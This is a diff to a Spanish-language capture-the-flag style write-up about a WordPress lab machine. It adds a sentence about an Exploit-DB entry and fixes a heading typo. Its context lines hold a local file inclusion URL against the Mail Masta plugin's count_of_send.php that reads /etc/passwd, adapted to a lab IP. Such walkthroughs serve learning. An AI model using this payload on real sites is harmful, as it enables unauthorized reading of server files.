@@ -38,6 +38,8 @@
 
 <img src="https://github.com/Dani-ITB24/Proyecto-Final/blob/Grupo5(Eloi-Alan-Fernando-Jose-Zomeño)/Documentos/Grupo%204/img_A08/plugin-exploitdb.png" alt="plugin-exploitdb">
 
+Como podemos ver, nos facilitan un link directo para poder visualizar el contenido del archivo /etc/passwd del servidor donde se está ejecutando el wordpress:
+
 **http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd**
 
 Lo cambiamos por **http://172.17.0.2/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd**
@@ -59,5 +61,5 @@ Lo cambiamos por **http://172.17.0.2/wordpress/wp-content/plugins/mail-masta/inc
 
 
 <br>
-<h1 name="flag-root">6. Flag de Roo</h1>
+<h1 name="flag-root">6. Flag de Root</h1>
 
